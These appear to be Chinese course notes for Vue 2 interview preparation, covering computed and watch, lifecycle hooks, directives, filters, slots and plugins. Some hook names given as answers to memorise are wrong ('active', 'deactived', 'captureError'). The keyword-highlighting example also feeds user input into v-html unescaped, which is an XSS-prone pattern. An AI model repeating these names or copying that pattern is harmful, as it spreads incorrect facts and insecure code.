# 面试题辅导第1天-笔记

2022年4月14日 星期四

*今天的话题：Vue补遗*



## 一、data、methods、watch、computed

### 1.1 computed基本使用

computed是函数，但是在template中，`{{}}`中要使用它，不能加圆括号。意味着`computed`的东西，是**值**，而**不是函数**。**但是定义的时候，用函数定义**。就是这么怪。

```vue
<template>
  <div>
    <h1>{{xxx}}</h1>
  </div>
</template>

<script>
  export default {
    computed: {
      xxx() {
        return 123123;
      }
    }
  }
</script>
```



比如我们有一个`data`值，是`a`，那么就可以有一个`computed`值，是：

```js
computed: {
	double() {
		return this.a * 2;
	}
}
```

在template中，不能用圆括号哦，就是`<h1>{{double}}</h1>`。

那么`double`就永远是a的2倍，`this.a`就是它的“依赖”。

***所以computed是啥意思呢：根据依赖（就是某个data值或者props值），计算后的某个值。***



<img src="F:/Web前端/BOSS直聘课程/学习资料/面试辅导/《面试题辅导第1天-案例和笔记》/markdown格式笔记/assets/image-20220414200844167.png" alt="image-20220414200844167" style="zoom: 33%;" />

我们学过的methods，能够替代computed的计算后的功能：

```js
methods: {
    liangbei() {
        return this.a * 2;
    }
},
```



### 1.2 computed可以拆为getter/setter，从而可以双向绑定

computed可以拆分为getter/setter，拆了之后，就能被v-model绑定到它身上。



我们现在希望，直接更改`double`值，而不是改a。是可以改`computed`值的，但是，必须要拆为`getter/setter`。

就是说：

```js
computed: {
	double: {
		get() {
			return this.a *2;
		},
		set(newValue) {
			this.a = newValue / 2;  	// 还原依赖值
		}
	}
}
```

工作没用，因为computed太闹腾，没几个人会，工作也很少用。但是面试考！

![image-20220414202105131](F:/Web前端/BOSS直聘课程/学习资料/面试辅导/《面试题辅导第1天-案例和笔记》/markdown格式笔记/assets/image-20220414202105131.png)



![image-20220414202652108](F:/Web前端/BOSS直聘课程/学习资料/面试辅导/《面试题辅导第1天-案例和笔记》/markdown格式笔记/assets/image-20220414202652108.png)

举一个例子：

<img src="F:/Web前端/BOSS直聘课程/学习资料/面试辅导/《面试题辅导第1天-案例和笔记》/markdown格式笔记/assets/image-20220414204234698.png" alt="image-20220414204234698" style="zoom: 33%;" />







### 1.3 面试题：computed和watch的区别和运用的场景？

**区别：**

`computed`是计算属性的意思。在Vue中，`computed`被定义为函数，但是不能传入任何参数，它只能“依赖”其它`data`或者`props`值。当它依赖的属性值发生改变，下一次获取 `computed` 的值时才会重新计算 `computed ` 的值。`computed`可以拆为`getter`和`setter`，这样的话，可以和`v-model`配合。

`watch`是监控变化的意思，类似于某些数据的监听回调 ，每当监听的数据变化时都会执行回调进行后续操作。

**运用场景：**
`computed`主要有两种应用场景：

1、当有**多个值联动**时，比如**我曾经制作过的美元、人民币、日元、欧元的换算**，用户可以在任何一个币种的输入框中输入数值，其他输入框要联动。此时用watch就会引发连锁变化的问题，所以使用`computed`，因为`computed`要有一个“依赖值”，我们自然而然用美元当做所有币种的**依赖值**，他们的`getter`都是美元乘汇率，他们的`setter`都是设置美元为`newValue`除汇率。当时那个例子做完之后，我对`computed`有了非常深的理解。

2、按常理，子组件的值不能直接`v-model`到props上，但是如果可以把这个props当做是一个computed值的依赖，那么就很好用。当父亲改变props时，getter重新算值；当自己改变父亲传入的值时，setter会执行`$emit`，很好用。



`watch`主要应用场景：

`watch`应用非常频繁，主要是监控`v-model`的值的变化，比如再做筛选器时，复选框的`v-model`值可以被`watch`，这样就能当复选框被改变时，发出Ajax了。



**补了一个案例：**父亲传过来的a，可以当做mya的依赖，mya是computed值，有setter/getter。其中在setter中有`this.$emit()`语句。

```vue
<template>
  <div>
    我是子组件，{{ mya }}
    <button @click="mya++">按我改变父亲的a</button>
    <el-slider v-model="mya"></el-slider>
  </div>
</template>

<script>
export default {
  props: ["a"],
  computed: {
    mya: {
      get() {
        return this.a;
      },
      set(newValue) {
        this.$emit("gaile", newValue);
      },
    },
  },
};
</script>
```



<img src="F:/Web前端/BOSS直聘课程/学习资料/面试辅导/《面试题辅导第1天-案例和笔记》/markdown格式笔记/assets/image-20220414205403368.png" alt="image-20220414205403368" style="zoom:50%;" />



### 1.4 面试题：computed的功能？有什么作用？

答：答案同上题。



### 1.5 面试题：watch有什么功能？

答：答案同上题。



### 1.6 面试题：methods有什么功能？

答：methods最常见的就是事件处理函数，我们的`@click="clickHandler()"`，这个`clickHandler`就要定义在methods中。

另外，methods中定义的函数，也可以直接显示在页面上，就是用双大括号里面写这个函数名字，加圆括号。比如，我曾经写过一个将时间戳变为日期的函数，叫做showDate()。

```js
showDate(timestamp) {
    var date = new Date(timestamp);
    var y = date.getFullYear();
    var m = date.getMonth() + 1;
    var d = date.getDate();
    return y + '-' + String(m).padStart(2, '0') + '-' + String(d).padStart(2, '0');
}
```



### 1.7 面试题：data为什么是一个函数？

答：如果`data`是一个对象，那么会造成：同一个组件的多个实例，它们的`data`是内存中同一个对象，子组件中的`data` 属性值会相互影响，这不是我们想要的。所以，`data`被设计为是函数，它非常类似“构造函数”，它的`return`值就是实例自己身上的值了。

而`methods`、`computed`、`watch`等，它们是对象是正确的。这样一来，所有实例都用的是同一个`methods`、`computed`、`watch`对象。



比如，下面的`<Zi />`都是Zi.vue的实例。他们的data是互不影响的，是分开的。

```
<template>
  <div>
    <Zi />
    <Zi />
    <Zi />
    <Zi />
    <Zi />
  </div>
</template>
```



<img src="F:/Web前端/BOSS直聘课程/学习资料/面试辅导/《面试题辅导第1天-案例和笔记》/markdown格式笔记/assets/image-20220414210528791.png" alt="image-20220414210528791" style="zoom:33%;" />





## 二、组件的生命周期

### 2.1 八种生命周期

官网图示必须要看一下：https://cn.vuejs.org/images/lifecycle.png



> 图片中，涉及到“虚拟节点”（Virtual-DOM），将在本周日第3天面试题辅导课上详细讲解。周日是“Vue底层原理之日”。
>
> 周六讲Vue全家桶，有vue-router生命周期，`active`、`deactived`



一共11个生命周期：

- 8个普通生命周期： `beforeCreate`、`created`、`beforeMount`、`mounted`、`beforeUpdate`、`updated`、`beforeDestroy`、`destroyed`。
- 2个和路由相关的生命周期： `active`、`deactived`
- 1个捕获错误的生命周期： `captureError`



*要求：必须如数家珍的背诵出来。*



八种普通的生命周期：

| 生命周期      | 作用                                                         |
| ------------- | ------------------------------------------------------------ |
| beforeCreate  | 组件创建之前。**没用**。因为这个生命周期，组件还没有创建，所有的`data`值无法访问，比如`this.a`会得到`undefined`。 |
| created       | 组件已经创建。**非常有用，**`data`值已经可以使用了，`methods`都可以使用，组件的一切都已经就绪了。我们通常在`created`生命周期中，发出Ajax请求。 |
| beforeMount   | 组件上树之前。**没用**。                                     |
| mounted       | 组件已经上树。**非常有用。**比如echarts要得到一个盒子，把图表放里面。就要用mounted生命周期。 |
| beforeUpdate  | 当data或者props改变之前触发。**没用。** 注意，不能在beforeUpdate生命周期中改变data、props，否则死循环。 |
| updated       | 当data或者props改变之后触发。**有点用。**注意，不能在updated生命周期中改变data、props，否则死循环。可能在updated时，将组件的数据用Ajax告诉服务器。 |
| beforeDestroy | 当组件消亡之前做的事情。**没用。**                           |
| destroyed     | 当组件消亡之后做的事情。**有点用。**比如清空本地存储数据。   |



### 2.2 面试题：Vue有哪些生命周期？你常用哪些生命周期？

答：Vue一共是11种生命周期，它们是：

- 8个普通生命周期： `beforeCreate`、`created`、`beforeMount`、`mounted`、`beforeUpdate`、`updated`、`beforeDestroy`、`destroyed`。
- 2个和路由相关的生命周期： `active`、`deactived`
- 1个捕获错误的生命周期： `captureError`



我工作中，最常用的生命周期是：

- `created`：这个生命周期用来发出Ajax请求，以及将props的值赋值给data；
- `mounted`： 这个生命周期用来得到DOM元素，比如`echart`图表的盒子，就要在这个生命周期中用`this.$refs`获得；
- `destroyed`: 这个生命周期通常用来配合本地存储，比如当组件消亡时，就命令本地存储器清空。



有时候会让你说生命周期的意义，就是2.1写的表格。



### 2.3 面试题：父子组件的生命周期顺序

- **加载渲染过程**： 父 beforeCreate → 父 created →  父 beforeMount →  子 beforeCreate →  子 created →  子 beforeMount → 子 mounted →  父 mounted
- **子组件更新过程（父亲的data当做props传给了子组件）**： 父 beforeUpdate -> 子 beforeUpdate -> 子 updated -> 父 updated
- **销毁过程（当父组件销毁，带着儿子一切销毁）**：父 beforeDestroy -> 子 beforeDestroy -> 子 destroyed -> 父 destroyed



*总结一句话：就是父亲的before和ed之前，会被子组件插。*



<img src="F:/Web前端/BOSS直聘课程/学习资料/面试辅导/《面试题辅导第1天-案例和笔记》/markdown格式笔记/assets/image-20220414214731097.png" alt="image-20220414214731097" style="zoom: 25%;" />



竖向版本：

```
父beforeCreate
父createed
父beforeMount
子beforeCreate
子created
子beforeMount
子Mounted
父Mounted
```



```
父beforeUpate
子beforeUpate
子upated
父upated
```



```
父beforeDestroy
子beforeDestroy
子destroyed
父destroyed
```




### 2.4  面试题：在哪个生命周期内调用异步请求？

理论上，可以在`created`、`beforeMount`、`mounted` 中发出Ajax请求，因为在这三个钩子函数中，`data` 已经创建、`this`也可以使用。(只要不是`beforeCreated`都能用)。

实战中，`created` 钩子函数发出Ajax请求是最多的，因为它有着独一无二的两个优点：

1、是**最快**的可用生命周期，第一时间获取到服务端数据，减少页面 `loading` 时间；

2、服务端渲染（SSR）不支持` beforeMount` 、`mounted`钩子函数，所以放在 `created `中有助于**一致性**；



> 注：服务端渲染，我们将放到“Node.js”课程中讲解。这些node工具都会在4月28日开始的Node.js课详细讲解。现在不理解，也得硬背：“服务端渲染不支持beforeMount和mounted"。



### 2.5 面试题：在什么阶段才能访问操作DOM？

在 `mounted` 中可以访问操作 DOM。使用`this.$refs`这个语法糖，可以快速访问操作DOM。比如Echarts图表，就要在`mounted`中去初始化。



### 2.6 面试题：父组件可以监听到子组件的生命周期吗？

比如有父组件`App`和子组件`Zi`，如果父组件监听到子组件`mounted` 就做一些逻辑处理，可以通过以下写法实现：

```html
// Zi.vue
<Zi @iMounted="iMountedHandler()"/>
    
// Zi.vue
mounted() {
  this.$emit("iMounted");
}
```

儿子一旦`mounted`了，那么就触发`$emit`了。

 



Vue提供了更好用的东西：`@hook`

```html
<Zi @hook:beforeCreate="x1" @hook:created="x2" @hook:beforeMount="x3"/>
```

这样，儿子就不用别别扭扭的`$emit`了。





## 三、这几天学习建议

1、背题。不背题吃亏！

2、保持手感。所以要写点东西，不一定写小程序，可以写筛选器、写收货地址。放一杯茶，手机定时，说我3小时，要重新封装省市县镇那个逻辑。封装PCAS组件，实现删除，和增加修改的一框两用。立个flag3小时写完。3小时内不看抖音、不看微博，就狂写，可以听音乐。练专注力。就是和自己较劲。

3、看录播视频。按顺序：《Cookie、Session、Token》、《Vue登录注册》、《POST请求的三种数据结构》、《Vue拖拽》、《图片上传》



简历赶紧准备，近期就有Soft Skill软技能辅导课。简历给班班老师给你修改。





# 面试题辅导第2天-笔记

2022年4月16日 星期六

*今天的话题：Vue补遗*



## 指令

### 面试题：v-show和v-if的区别和适用场景？（高频面试点）

**区别：**

`v-if `决定元素上树与下树。

​	① 如果`v-if`写在子组件标签上，比如`<Zi v-if="m"/>`，那么能引发子组件的销毁和重建；

​	② `v-if`是惰性的：如果在初始渲染时条件为假，则什么也不做，直到条件第一次变为真时，才会开始渲染条件块；

​	③ `v-if`能结合`v-else`使用，而`v-show`不能。



`v-show `决定元素显示与隐藏。

​	① 如果`v-show`写在子组件标签上，不引发子组件的任何生命周期。

​	②`v-show`不是惰性的，不管初始条件是什么，元素总是会被渲染，并且只是简单地基于 CSS 的 display`”属性进行切换。

​	③ 不能结合`v-else`使用。



**适用场景：**

- `v-if` 适用于：
  - 需要触发子组件的生命周期，特别是销毁子组件时，比如弹出层的表单；
  - 需要初始值惰性防错时，比如Ajax值没有返回回来，那么`arr[0].title`就会报错，而如果写在`v-if="arr.length != 0"`的盒子中，就没有错误了；
  - 不适合大型子组件频繁切换。

- `v-show` 适用于：
  - 不需惰性防错，只是简单的显示、隐藏特效。

 

比如，我们现在要显示arr数组中下标为0这项的title，那么这么写：

```html
<template>
  <div>
    <!-- 这里写v-if的目的是，总有那么一瞬间，Ajax没有返回，所以arr是空数组，arr[0]就是undefined。从而undefined打点访问了title，使得控制台有报错。Cannot Read Properties of Undefined。解决方法就是加上v-if，这样只有arr数组中有项，才将这个div上树。利用了v-if的惰性特点，就是说如果v-if条件是假，则内部什么都没有上树，从而不会执行里面语句。 -->
    <div v-if="arr.length != 0">
      <h1>{{arr[0].title}}</h1>
    </div>
  </div>
</template>
```



v-if后面能够跟上v-else，表示当v-if条件为假的时候，这个盒子上树。

```html
<div v-if="m">A</div>
<div v-else>B</div>
```

m是真，A上树，B下树。m是假，A下树，B上树。





### 面试题：v-text和v-html的区别

`v-text`不会解析HTML标签，而`v-html`会解析HTML标签。但要注意的是，`v-text`和`v-html`中的HTML标签，无法渲染双大括号、指令等Vue的语法。

我曾经用`v-html`制作过“智能感应”，比如用户输入“烊千”，那么“易烊千玺”会感应出来，并且“烊千”两个字是标红的。思路就是用`v-html`指令，让“烊千”两个字被`span`包裹。



`v-text`和`v-html`都能够给元素内部添加文字，区别就是`v-text`不解析HTML标签，而`v-html`能。

```html
<div v-text="'我<b>爱你'"></div>
<div v-html="'我<b>爱</b>你'"></div>
```

<img src="F:/Web前端/BOSS直聘课程/学习资料/面试辅导/《面试题辅导第2天-案例和笔记》/markdown格式笔记/assets/image-20220416142452726.png" alt="image-20220416142452726" style="zoom:50%;" />



<img src="F:/Web前端/BOSS直聘课程/学习资料/面试辅导/《面试题辅导第2天-案例和笔记》/markdown格式笔记/assets/image-20220416143439947.png" alt="image-20220416143439947" style="zoom:33%;" />

智能感应的代码：

```vue
<template>
  <div>
    <input type="text" v-model="keyword">
    <ul>
      <li 
        v-for="(item, index) in arr" 
        :key="index"
        v-html="giveMeAHtml(item)"
      >
      </li>
    </ul>
  </div>
</template>

<script>
  export default {
    data() {
      return {
        keyword: '烊千',
        arr: [
          '张烊千人',
          '王烊千啊',
          '刘李烊千',
          '烊千啊啊',
          '易烊千玺',
        ]
      }
    },
    methods: {
      giveMeAHtml(str) {
        const index = str.indexOf(this.keyword);
        if (index != -1) {
          return str.slice(0, index) + '<b>' + this.keyword + '</b>' + str.slice(index + this.keyword.length);
        }
      }
    },
  }
</script>
```



 

### 面试题：class  如何动态绑定？

口诀：”引包大“ 。引号里面是大括号。

```html
<div :class="{current: index == nowIndex}"></div>
```



普通class和动态class可以写在一个div中：

```html
<div class="box" :class="{cur: index == nowIndex}"></div>
```



其实还有数组+对象形式：

```html
<div :class="['cu', 'hong', { xie: 3 > 2, xian: 3 > 500 }]">
    你好
</div>
```

解释：**数组中的字符串会被当做一定有的类名，而对象呢？要看表达式是否为真**。即，cu这个类名一定有、hong一定有。xie因为表达式是真，也有。xian因为表达式是假，所以没有。

等价于：

```html
<div class="cu hong" :class="{ xie: 3 > 2, xian: 3 > 500 }"></div>
```

等价于：

```html
<div :class="{ cu: true, hong: true, xie: 3 > 2, xian: 3 > 500 }"></div>
```





### 面试题：Style如何动态绑定？

口诀：”引包大“ 。

```html
<div :style="{width: a + 'px'}"></div>
```



注意下面这个例子：

```html
<div
     class="box"
     :style="{ 'width': a + 'px', 'transform': 'rotate(' + b + 'deg)', 'border-width': c + 'px' }"
>
</div>
```

<img src="F:/Web前端/BOSS直聘课程/学习资料/面试辅导/《面试题辅导第2天-案例和笔记》/markdown格式笔记/assets/image-20220416144746794.png" alt="image-20220416144746794" style="zoom:33%;" />



其实还有数组+对象形式：

```html
<div :style="[styleObjectA, styleObjectB]"></div>
```



比如这个：

```html
<section :style="[ys1, ys2()]">哈哈哈</section>
```

ys1定义在data中，是一个对象：

```js
data() {
    return {
        ys1: {
            'color': 'red',
            'font-size': '40px'
        }
    };
},
```

ys2是一个函数，定义在methods中，返回一个对象：

```js
methods: {
    ys2() {
        return {
            'transform': 'rotate(' + (this.a * 2) + 'deg)'
        }
    }
},
```



### v-bind、v-on

`v-bind`是`:`的全称，`v-on`是`@`的全称。

比如：

```html
<button v-bind:disabled="a == 4" v-on:click="a++">按我加1</button>
<img v-bind:src="a + '.jpg'" />
```

等价于：

```html
<button :disabled="a == 4" @click="a++">按我加1</button>
<img :src="a + '.jpg'" />
```



但是工作中，没有人用`v-bind`全称，都是冒号。我们讲解，就是怕面试问。



### 面试题：v-model可以用哪些修饰符？

> 什么是修饰符？就是一些指令后面可以打点，表示修饰。



必须背诵`v-model`有三个修饰符：

- `.lazy` - 加上`.lazy`之后，拖拽条松手才改变a的值，拖拽过程中不改变a的值。即取代了 `input` 监听 `change` 事件。
- `.number` - 输入字符串转为数字
- `.trim` - 输入首尾空格过滤



比如拖拽条，加了`.lazy`，只有松手的时候才触发，拖拽的时候，不触发。

```html
<input type="range" v-model.lazy="a">
```



比如文本框，加了`.number`，输入的东西就是数字了，双向绑定改变a为数字，不是字符串

```html
<input type="text" v-model.number="a">
```



比如文本框，加了`.trim`，输入的东西前后的空格会被自动去掉。

```html
<input type="text" v-model.number.trim="a">
```



### 面试题：@click有哪些修饰符？

`.stop` 阻止事件冒泡

`.prevent` 阻止默认行为



比如，a标签现在`href`是百度，但是`@click`加了`.prevent`，那么点击之后，只执行`clickHandler`，而不会去百度。因为`.prevent`表示阻止默认行为。

```html
<a href="http://www.baidu.com" @click.prevent="clickHandler()">
    哈哈
</a>
```



比如，现在做一个弹出层的模拟（就是没有用`el-dialog`）：

```html
<div class="mask" v-show="isShow" @click="isShow = false">
    <div class="inner" @click.stop>
        中间盒子
    </div>
</div>
```

点击mask会让遮罩关闭。但是中间的inner点击的时候，会事件冒泡到mask上。所以要加`@click.stop`，阻止事件冒泡。

![image-20220416152047727](F:/Web前端/BOSS直聘课程/学习资料/面试辅导/《面试题辅导第2天-案例和笔记》/markdown格式笔记/assets/image-20220416152047727.png)





### 我们面试题：如何将父组件的全部props，都传给子组件？

使用$props语法糖：

```html
<child-component v-bind="$props"></child-component>
```

新知识：`$props`表示自己收到的所有props。那么可以通过`v-bind="$props"`，将自己的全部props都传给子组件。





### 面试题：v-pre指令和v-once指令有什么用？

`v-pre`指令跳过这个元素和它的子元素的编译过程。可以用来显示原始标签，内部的所有双大括号和指令都不会执行，适用于跳过大量没有指令的HTML元素，会**加快编译过程**。

`v-once`指令只渲染元素和组件**一次**。一旦数据渲染了，今后所有的重新渲染，将被视为静态内容并跳过。这可以用于**优化更新性能**。



当某一个`div`中都是“死内容”，没有双大括号，没有指令，那么就可以写上`v-pre`，加快编译过程。Vue就不用死气白咧的去里面寻找动态内容了。

```html
<div v-pre>
    <h1>字字字字</h1>
    <div>
        <ul>
            <li>项目</li>
            <li>项目</li>
            <li>项目</li>
            <li>项目</li>
        </ul>
    </div>
</div>
```



`v-once`只渲染一次，第一次a的改变能够引发视图更新，但是第二次a就不变了。

```html
<div v-once>
    <h1>{{ a }}</h1>
    <button @click="a++">按我a加1</button>
</div>
```

`v-once`经常用于Ajax的填充列表，而这个列表一旦Ajax请求回来不会变化，即没有分页条、没有筛选器。



### v-cloak指令

> 简单了解一下即可，没有考过

这个指令保持在元素上直到关联实例结束编译。和 CSS 规则如` [v-cloak] { display: none } `一起用时，这个指令可以隐藏未编译的 Mustache 标签（就是双大括号`{{}}`、指令）直到实例准备完毕。



`v-cloak`指令不是加到某一个vue文件中的div上的，而是加到public/index.html中的那个div#app上的：

```html
<!DOCTYPE html>
<html lang="">
  <head>
    <style>
      [v-cloak] {
        display: none;
      }
    </style>
   </head>
  <body>
    <div id="app" v-cloak></div>
  </body>
</html>

```



### 面试题：v-bind:is指令有什么用？

*`is`就表示动态选择用什么组件*。`:is=""`双引号里面是组件的标签名。

准备三个子组件：

<img src="F:/Web前端/BOSS直聘课程/学习资料/面试辅导/《面试题辅导第2天-案例和笔记》/markdown格式笔记/assets/image-20220416160004090.png" alt="image-20220416160004090" style="zoom: 50%;" />



nowStep值是1的时候，让Step1组件显示；

nowStep值是2的时候，让Step2组件显示；

nowStep值是3的时候，让Step3组件显示；

可以这么写：

```html
<div style="padding: 40px">
    <Step1 v-if="nowStep == 1" />
    <Step2 v-if="nowStep == 2" />
    <Step3 v-if="nowStep == 3" />
</div>
```

简化为：

```html
<div style="padding: 40px">
	<div :is="'Step' + nowStep"></div>
</div>
```

*`is`就表示动态选择用什么组件*。`:is=""`双引号里面是组件的标签名。

你说，老师还是`v-if`简单，`:is`看着就晕，对！`:is`实战中确实不如`v-if`常用。



### 自定义指令

https://cn.vuejs.org/v2/guide/custom-directive.html

https://cn.vuejs.org/v2/api/#Vue-directive



比如Vue自带了`v-for`、`v-if`、`v-model`、`v-pre`、`v-once`等指令，但是没有`v-yiyi`指令。我们可以自定义。比如，我们希望`v-yiyi`指令的用途是设置字的颜色。

在main.js，`new Vue`之前，使用`Vue.directive()`来自定义指令。一定要把`directive`这个单词背下来！因为面试官问你，”如何自定义指令“，第一个事儿，就是把API单词儿说出来。

<img src="F:/Web前端/BOSS直聘课程/学习资料/面试辅导/《面试题辅导第2天-案例和笔记》/markdown格式笔记/assets/image-20220416161833676.png" alt="image-20220416161833676" style="zoom: 50%;" />

```js
// 自定义指令
Vue.directive('yiyi', {
  // 当这个指令被绑定到元素上的时候，执行
  bind(el, binding) {
    // el表示添加指令的那个HTML元素
    // binging就是信息对象
    el.style.color = binding.value;

    if (binding.modifiers.a) {
      el.style.fontWeight = 'bold';
    }
    if (binding.modifiers.b) {
      el.style.fontStyle = 'italic';
    }
  },
  // 当指令值更新的时候
  update(el, binding) {
    el.style.color = binding.value;
  }
});


new Vue({
    
});
```



组件中：

```html
<div v-yiyi.a="'red'">哈哈哈哈哈</div>
<div v-yiyi.b="'#338877'">哈哈哈哈哈</div>

<div v-yiyi="m">哈哈哈哈哈</div>
<button @click="m = 'pink'">按我</button>
```

a、b是修饰符。类似于v-model指令的lazy、number、trim；和@click的prevent、stop。



<img src="F:/Web前端/BOSS直聘课程/学习资料/面试辅导/《面试题辅导第2天-案例和笔记》/markdown格式笔记/assets/image-20220416161645978.png" alt="image-20220416161645978" style="zoom:50%;" />



亲爱的面试官，我曾经封装过一个`v-qianfen`指令，功能是让内部的数字加上千分符。非常好用。

```js
// 自定义指令
Vue.directive('qianfen', {
  bind(el, binding) {
    // 变为数组的目的：数组有splice方法，能够方便的指定下标插入元素
    let arr = String(binding.value).split('');

    for (let i = arr.length - 3; i > 0; i -= 3) {
      // splice是多功能方法，表示在下标为1的项，删除0项，插入一个逗号
      arr.splice(i, 0, ',');
    }

    // 改变携带指令的元素的内部文字
    el.innerText = arr.join('');
  },
  componentUpdated(el, binding, vnode) {
    // 变为数组的目的：数组有splice方法，能够方便的指定下标插入元素
    let arr = String(binding.value).split('');

    for (let i = arr.length - 3; i > 0; i -= 3) {
      // splice是多功能方法，表示在下标为1的项，删除0项，插入一个逗号
      arr.splice(i, 0, ',');
    }

    // 改变携带指令的元素的内部文字
    el.innerText = arr.join('');
  }
});
```

组件中：

```html
<!-- qianfen指令演示 -->
<h1 v-qianfen="2342345456234345"></h1>
<h1 v-qianfen="123"></h1>
<h1 v-qianfen="34534"></h1>
<h1 v-qianfen="345343456"></h1>
<h1 v-qianfen="34534345645"></h1>
<h1 v-qianfen="34534345645"></h1>
<h1 v-qianfen="a"></h1>
<button @click="a++">按我a加1</button>
```

只要面试官问你“自定义指令”，那么你就说封装过qianfen指令。并且遇见了坑，就是一开始把数字写在标签内，但是如果标签内是{{a}}，那么就无法改变这个a。因为{{a}}会把值算出来，是一个死值，传给Vue.directive，解决方法就是把数字写在指令的等号中了。`v-qianfen="a"`。

<img src="F:/Web前端/BOSS直聘课程/学习资料/面试辅导/《面试题辅导第2天-案例和笔记》/markdown格式笔记/assets/image-20220416164554229.png" alt="image-20220416164554229" style="zoom: 33%;" />

我们是在全局范围内定义的指令（定义在了main.js文件中了），如果只想让当前组件定义指令，那么可以在组件中写directive：

```js
// 组件中
export default {
    directives: {
        erer: (el, binding) => {
            el.innerText = '嘻嘻嘻爱'
        }
    }
};
```





## Vue自定义过滤器

https://cn.vuejs.org/v2/api/#Vue-filter



**什么是过滤器**：过滤器，只能用在`{{}}`中，不能用在任何其他地方！就是双大括号中的竖线。表示对值进行形式转换。比如加千分符、小写字母变大写字母。所以，*过滤器不是用来过滤的，是用来加工的。应该叫做“加工器”*。



```html
<h1>
	{{ a | qianfen }}
</h1>
```

自定义过滤器用`Vue.filter`。第一个参数是过滤器的名字，第二个参数是一个函数，函数的形参是你要加工的值。

```js
Vue.filter('qianfen', value => {
    let arr = String(value).split('');
    for (let i = arr.length - 3; i > 0; i -= 3) {
        arr.splice(i, 0, ',');
    }
    return arr.join('');
});
```



<img src="F:/Web前端/BOSS直聘课程/学习资料/面试辅导/《面试题辅导第2天-案例和笔记》/markdown格式笔记/assets/image-20220416165531277.png" alt="image-20220416165531277" style="zoom:50%;" />

定义首字母大写过滤器：

```js
// 首字母大写过滤器
Vue.filter('capitalize',  value => {
    return value[0].toUpperCase() + value.slice(1)
});
```



过滤器可以连续使用：

```js
<h1>
	{{ 'abcdefghijk' | capitalize | qianfen }}
</h1>
```



我们是在全局范围内定义的过滤器（定义在了main.js文件中了），如果只想让当前组件定义过滤器，那么可以在组件中写filters：

```js
export default {
    data() {
        return {
            a: 998,
        };
    },
    filters: {
        xxx: value => {
            return 'xxxxxx'
        }
    }
};
```



## 插槽

*插槽slot意义何在：能够让父组件定义子组件的HTML结构。*

### 插槽的基本使用

<img src="F:/Web前端/BOSS直聘课程/学习资料/面试辅导/《面试题辅导第2天-案例和笔记》/markdown格式笔记/assets/image-20220416172019235.png" alt="image-20220416172019235" style="zoom:50%;" />



父组件中，引用子组件。在子组件的标签对儿中写内容，这些内容将被原样誊抄到子组件的`<slot></slot>`中。如果有双大括号，那么用的是父组件的data值。

下面这个图，非常关键：

![image-20220416172312149](F:/Web前端/BOSS直聘课程/学习资料/面试辅导/《面试题辅导第2天-案例和笔记》/markdown格式笔记/assets/image-20220416172312149.png)



### 具名插槽

父组件在子组件内部，可以写多个`<div slot="名字"></div>`，就是具名插槽了。

在子组件中，就可以用`<slot name="名字"></slot>`来原样誊抄HTML了。

`name`是固定的属性。

<img src="F:/Web前端/BOSS直聘课程/学习资料/面试辅导/《面试题辅导第2天-案例和笔记》/markdown格式笔记/assets/image-20220416172931363.png" alt="image-20220416172931363" style="zoom:50%;" />



特别的，可以用`<template #名字>`：

![image-20220416173151913](F:/Web前端/BOSS直聘课程/学习资料/面试辅导/《面试题辅导第2天-案例和笔记》/markdown格式笔记/assets/image-20220416173151913.png)



### 插槽的数据传递

一图胜过千言万语：

![image-20220416174726228](F:/Web前端/BOSS直聘课程/学习资料/面试辅导/《面试题辅导第2天-案例和笔记》/markdown格式笔记/assets/image-20220416174726228.png)

不粘贴代码了。

我们又看见了一个指令`v-slot`，就是给插槽的暴露域起一个名字，比如`<Zi v-slot:default="scope">`。





# 面试题辅导第3天 - 笔记

2022年4月17日 星期日

*今天的话题：Vue补遗*



## $set和$delete

### this.$set()

#### 数组要改变某一个项的值

*直接用下标更改数组的某一项无法导致视图更新*。为什么：因为Vue的底层原因，察觉不到数组某一项的变化。



比如：

`data`中有一个arr，值为`["A", "B", "C", "D"]`，然后在按钮的事件处理函数中书写这条语句：

```js
this.arr[2] = "X";
```

点击按钮后，视图没有任何变化。这是因为：*Vue无法检测到“用下标直接改变某个数组项”的这个行为*。



Vue能够检测到数组的变化是*7个*方法：

	- push()
	- pop()
	- unshift()
	- shift()
	- splice()
	- reverse()
	- sort()

说白了，就是数组的上面7个方法，能够引发视图更新。

*但是，“用下标直接改变某个数组项”的这个行为是无法被检测到的。*



**解决办法①：**使用Vue提供的$set()

```js
this.$set(this.arr, 2, 'X');
```

表示我要改变this.arr的下标为2的项，改为X。



**解决办法②：**使用“map”

```js
this.arr = this.arr.map((item, index) => index == 2 ? "X" : item);
```



#### 对象要增加属性

`this.$set()`还有一种使用情形，就是*给对象添加键名的时候，也不会引发视图更新*：

```js
this.obj.d = 4;
```

**解决方法①：**使用Vue提供的$set()

```js
this.$set(this.obj, 'd', 4);
```



**解决办法②：**使用`...`运算符

```js
this.obj = { ...this.obj, c: 9 };
```





### this.$delete

删除对象的键名，无法引发视图更新。

```js
delete this.obj.a;		// 这句话是一个正确的语句，功能是删除a属性，但是Vue中不引发视图更新
```



使用方法是使用this.$delete：

```js
this.$delete(this.obj, 'a');
```



也可以用于数组删除项：

```js
this.$delete(this.arr, 2);  // 删除了下标为2的项，等价于this.arr.splice(2, 1)。而splice能够引发视图更新，所以数组删除某项，splice就行，不用$delete。
```





## Vue.use()和Vue插件机理

### Vue.use()机理

https://cn.vuejs.org/v2/api/#Vue-use

https://cn.vuejs.org/v2/guide/plugins.html



`Vue.use()`用来安装 Vue.js 插件。是一个对象必须提供 `install` 方法。也可以是一个函数，它会被作为 install 方法。install 方法调用时，会将 Vue 作为参数传入。从而，我们可以用`Vue.directive`给Vue增加自定义指令，或者`Vue.filter`增加自定义过滤器，或者用`Vue.component`增加全局组件。



比如，可以把昨天讲解的2种指令、1种过滤器当做“插件”：

```js
Vue.use({
    install(Vue) {
        Vue.directive('yiyi', (e, binding) => {
            e.style.color = binding.value;
        });

        Vue.directive('qianfen', {
            bind(el, binding) {
                ……
            },
            componentUpdated(el, binding, vnode) {
                ……
            }
        });
        
        
        Vue.filter('capitalize', value => {
            return value[0].toUpperCase() + value.slice(1)
        });
    }
});
```

同志们，最基本的要求，是单词要背下来：

```
Vue.use()中运行的是哪个函数，或者说必须有哪个函数？？
1. setup()
2. install() 是对的
3. init()
4. initialzation()
```



### 面试题：element-ui是如何注册组件的？

新知识点：使用`Vue.component()`能够注册全局组件。

```js
Vue.use({
    install(Vue) {
        Vue.component('zkt-dafen', () => import('./ZKTUIComponents/zkt-dafen.vue'));
    }
});
```

*当一个组件被`Vue.use`注册成为全局组件后，在任何组件中都不需要“创引定”了，直接“上”标签即可。*



